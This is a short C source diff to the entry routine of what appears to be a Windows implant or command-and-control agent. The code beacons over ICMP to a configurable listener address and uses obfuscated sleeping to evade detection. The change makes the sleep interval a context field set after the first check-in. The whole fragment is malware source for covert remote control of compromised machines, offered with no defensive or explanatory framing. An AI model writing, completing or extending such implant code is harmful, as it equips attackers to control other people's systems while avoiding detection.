@@ -80,6 +80,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					if ( TaskHello( Ctx, 0, NULL, 0, Onb ) != ErrorAction ) {
 						/* Change the IP to be configurable */
 						Ctx->Established = IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx, Onb->Buffer, Onb->Length );
+						Ctx->SleepTime   = ROGUE_WAIT_PERIOD;
 					};
 				};
 			};
@@ -170,7 +171,9 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					Inb = NULL;
 				};
 				if ( Ctx->Established != FALSE ) {
-					SleepObfuscate( ROGUE_WAIT_PERIOD );
+					if ( Ctx->SleepTime != 0 ) {
+						SleepObfuscate( Ctx->SleepTime );
+					};
 				};
 			};
 		};
